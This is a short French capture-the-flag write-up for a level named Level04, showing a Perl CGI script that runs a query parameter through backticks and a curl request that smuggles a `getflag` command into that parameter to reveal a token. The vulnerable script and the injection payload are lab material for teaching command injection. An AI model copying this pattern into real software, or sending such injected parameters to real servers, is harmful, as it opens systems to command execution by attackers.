# Level04

On trouve un script <code>level04.pl</code>

<pre>#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));</pre>

Après lecture, on voit qu'il s'exécute lorsqu'on effectue une requête sur <code>localhost:4747</code> et qu'il prend un paramètre.

<pre>$ curl 192.168.56.102:4747?x=test
test</pre>

Avec "test" comme paramètre, le programme écrit <code>test</code> sur la sortie standard. On peut donc injecter une commande que le script exécutera avec ses droits grâce aux backquotes :

<pre>$ curl 192.168.56.102:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap</pre>
